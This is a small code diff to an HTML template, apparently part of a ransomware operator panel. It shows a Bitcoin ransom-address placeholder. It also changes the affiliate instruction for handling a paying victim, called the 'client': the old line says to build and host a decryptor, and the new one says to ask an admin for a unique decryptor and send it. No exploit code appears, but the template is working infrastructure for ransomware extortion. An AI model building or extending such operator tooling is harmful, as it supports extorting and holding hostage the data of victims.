@@ -6,4 +6,4 @@
 <p><strong>Bitcoin address: </strong>{{$btc}}</p><br>
 </center><br>
 
-<p style="font-color: red;"><em><strong>If the client has paid, build decryptor, host it on a public site and mark the client's payment as SUCCESS</strong></em></p><br>
+<p style="font-color: red;"><em><strong>If the client has paid, contact admin to build unique decryptor and send to your client. Job well done!</strong></em></p><br>
